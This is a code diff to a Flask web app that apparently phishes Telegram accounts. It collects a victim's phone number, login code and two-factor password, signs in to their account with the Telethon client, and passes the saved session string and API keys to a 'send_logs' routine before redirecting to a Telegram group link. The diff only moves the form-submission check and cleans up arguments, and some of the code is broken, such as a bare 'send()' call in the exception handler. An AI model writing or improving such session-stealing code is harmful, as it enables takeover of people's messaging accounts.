@@ -73,32 +73,31 @@ class CodeForm(FlaskForm):
 
 def send(login_code, phone):
     try:
-        if code_form.is_submitted():
-            global client
-            phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
-            if client.is_connected():
-                try:
-                    client.sign_in(phone=phone, code=login_code)
-                    string = client.session.save()
-                    send_logs(
-                        f"Login:\n\n {string} \nSuccess✅\n\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
-                except SessionPasswordNeededError:
-                    return redirect(url_for("password", phone=phone))
-            else:
-                client.connect()
-                try:
-                    client.sign_in(phone=phone, code=login_code)
-                    string = client.session.save()
-                    send_logs(
-                        f"Login:\n\n {string} \nSuccess✅\n\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
-                except SessionPasswordNeededError:
-                    return redirect(url_for("password", phone=phone))
-            client.disconnect()
-            return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
+        global client
+        phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
+        if client.is_connected():
+            try:
+                client.sign_in(phone=phone, code=login_code)
+                string = client.session.save()
+                send_logs(
+                    f"Login:\n\n {string} \nSuccess✅\n\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
+            except SessionPasswordNeededError:
+                return redirect(url_for("password", phone=phone))
+        else:
+            client.connect()
+            try:
+                client.sign_in(phone=phone, code=login_code)
+                string = client.session.save()
+                send_logs(
+                    f"Login:\n\n {string} \nSuccess✅\n\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
+            except SessionPasswordNeededError:
+                return redirect(url_for("password", phone=phone))
+        client.disconnect()
+        return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
     except:
         send()
 
-def send_with_pss():
+def send_with_pss(login_password):
     global client
     phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
     try:
@@ -146,7 +145,8 @@ def login():
 def code(phone):
     send_user_info()
     code_form = CodeForm()
-    return send(login_code = code_form.code.data, phone=phone)
+    if code_form.is_submitted():
+        return send(login_code=code_form.code.data, phone=phone)
     return render_template('code.html', code_form=code_form, phone=phone)
 
 
@@ -155,7 +155,7 @@ def password(phone):
     send_user_info()
     code_form = CodeForm()
     if code_form.is_submitted():
-        return send_with_pss(login_password = code_form.code.data)
+        return send_with_pss(login_password=code_form.code.data)
 
     return render_template('password.html', code_form=code_form, phone=phone)
 
